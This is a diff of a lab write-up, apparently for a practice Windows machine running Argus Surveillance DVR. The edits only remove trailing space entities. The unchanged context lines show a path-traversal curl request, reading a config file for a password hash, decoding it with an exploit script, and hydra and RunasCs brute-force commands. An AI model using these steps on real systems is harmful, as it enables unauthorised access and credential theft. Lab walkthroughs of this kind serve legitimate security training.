@@ -26,7 +26,7 @@ PORT      STATE SERVICE
 49669/tcp open  unknown
 ```
 
-SSH is open on this Windows machine, so let's take note of that.&#x20;
+SSH is open on this Windows machine, so let's take note of that.
 
 ### Argus Surveillance -> LFI SSH Key
 
@@ -103,7 +103,7 @@ $ curl "http://192.168.201.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F
 ```
 {% endcode %}
 
-This means that the application is being run by the administrator instead of `viewer`. There were other exploits that we didn't use yet. I found that the Weak Password Encryption was one of them. This involved reading the password hash from the configuration files of Argus.&#x20;
+This means that the application is being run by the administrator instead of `viewer`. There were other exploits that we didn't use yet. I found that the Weak Password Encryption was one of them. This involved reading the password hash from the configuration files of Argus.
 
 ```
 C:\ProgramData\PY_Software\Argus Surveillance DVR>type DVRParams.ini
@@ -140,7 +140,7 @@ $ python3 50130.py
 [-] D9A8:Unknown
 ```
 
-The last character is unknown. When looking at the script, it doesn't seem to map special characters within the dictionary. In this case, we can create a wordlist of the special characters.&#x20;
+The last character is unknown. When looking at the script, it doesn't seem to map special characters within the dictionary. In this case, we can create a wordlist of the special characters.
 
 ```
 $ cat /usr/share/seclists/Fuzzing/special-chars.txt > wordlist.txt
@@ -153,7 +153,7 @@ Afterwards, we can attempt to brute force the `ssh` access using `hydra`:
 $ hydra -l administrator -P wordlist.txt 192.168.201.179 ssh
 ```
 
-However, this didn't work for some reason, so maybe the administrator does not have SSH access. Instead, I brute forced the passwords one by one with `RunasCs.exe` to check which worked.&#x20;
+However, this didn't work for some reason, so maybe the administrator does not have SSH access. Instead, I brute forced the passwords one by one with `RunasCs.exe` to check which worked.
 
 Eventually one worked:
 
